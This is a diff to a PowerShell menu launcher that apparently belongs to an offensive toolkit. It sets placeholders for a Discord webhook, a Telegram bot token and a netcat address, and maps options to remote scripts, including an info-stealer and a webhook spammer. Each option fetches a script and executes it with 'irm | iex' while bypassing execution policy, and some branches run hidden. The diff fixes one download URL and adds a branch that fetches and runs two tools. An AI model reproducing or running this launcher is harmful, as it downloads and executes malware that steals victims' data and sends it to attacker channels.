@@ -14,6 +14,7 @@ $hookurl = "DISCORD_WEBHOOK_HERE"
 $ghurl = "PASTEBIN_URL_HERE"
 $tg = "TELEGRAM_BOT_TOKEN"
 $NCurl = "YOUR_NETCAT_IP_ADDRESS" # no port
+
 $Host.UI.RawUI.BackgroundColor = "Black"
 Clear-Host
 [Console]::SetWindowSize(80, 35)
@@ -74,7 +75,7 @@ $Option = Read-Host "$list"
     if ($Option -eq '9'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Network-Enumeration-GUI.ps1"}
     if ($Option -eq '10'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Mute-Microphone-GUI.ps1"}
     if ($Option -eq '11'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Webhook-Spammer-GUI.ps1"}
-    if ($Option -eq '12'){$url = "https://github.com/beigeworm/assets/blob/main/master/Social-Search-GUI.ps1"}
+    if ($Option -eq '12'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Social-Search-GUI.ps1"}
     if ($Option -eq '13'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-GDI-Efects-GUI.ps1"}
     
     if ($Option -eq '14'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Telegram-InfoStealer.ps1"}
@@ -126,6 +127,10 @@ $Option = Read-Host "$list"
             Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
             break
         }
+        if (($Option -eq '12') -or ($Option -eq '4')){
+            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$stage = 'y'; irm $url | iex")
+            break
+        }
         else{
             Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
             break
@@ -134,4 +139,3 @@ $Option = Read-Host "$list"
 
 sleep 1
 }
-
